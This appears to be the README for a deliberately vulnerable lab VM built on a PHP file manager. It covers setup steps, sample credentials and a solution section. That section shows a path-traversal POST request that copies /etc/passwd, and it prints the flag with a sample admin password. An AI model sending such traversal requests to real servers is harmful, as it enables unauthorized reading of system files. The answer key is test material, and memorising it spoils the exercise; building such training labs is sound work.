# Roxy (traversal-2)

Download VM:
* Credentials: ```user/user```, ```root/123456```
* SSH disabled
* Debian 11, 2 GB disk

# Agenda

You have to find out how files are uploaded to the server, where they are stored, and how to download them. You will need your creative thinking to find the vulnerability in the functionality of downloading files.

# Setup

*Requirements:*  **2 GB** of disk space for VM.

Put all files in **source** to folder **/var/www/html/**


```bash
sudo apt-get update --allow-releaseinfo-change
sudo apt-get install nginx php-fpm  php-mbstring php-gd sudo

sudo chown www-data:www-data -R /var/www/html/
sudo chmod 755 -R /var/www/html/*
```



#### Nginx configure

Change **/etc/nginx/sites-enabled/default** (php-fpm version may be different):

```
server {
        listen 80 default_server;
        listen [::]:80 default_server;

        root /var/www/html;
        index index.php;
        server_name _;

        location / {
                try_files $uri $uri/ =404;
        }
        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }

}
```

Reload nginx config
```
sudo service nginx restart
#sudo systemctl restart nginx
```


## How to check that everything works ?

1. Open the main page. You should see the working app. 


## Solution

Path traversal.

https://www.exploit-db.com/exploits/46085

1. Copy **private** folder to **Uploads**


```
POST /php/copyfile.php?f=%2FUploads%2Froxy-fileman-logo.gif&n=%2FUploads%2FImages HTTP/1.1


f=%2FUploads%2F/../../../../../../../../etc/passwd&n=%2FUploads%2FImages
```

2. Flag in **private** folder:
```
Admin password is qX83TyWhMcEHE3K.

This is last time Dave, install keepass ...
```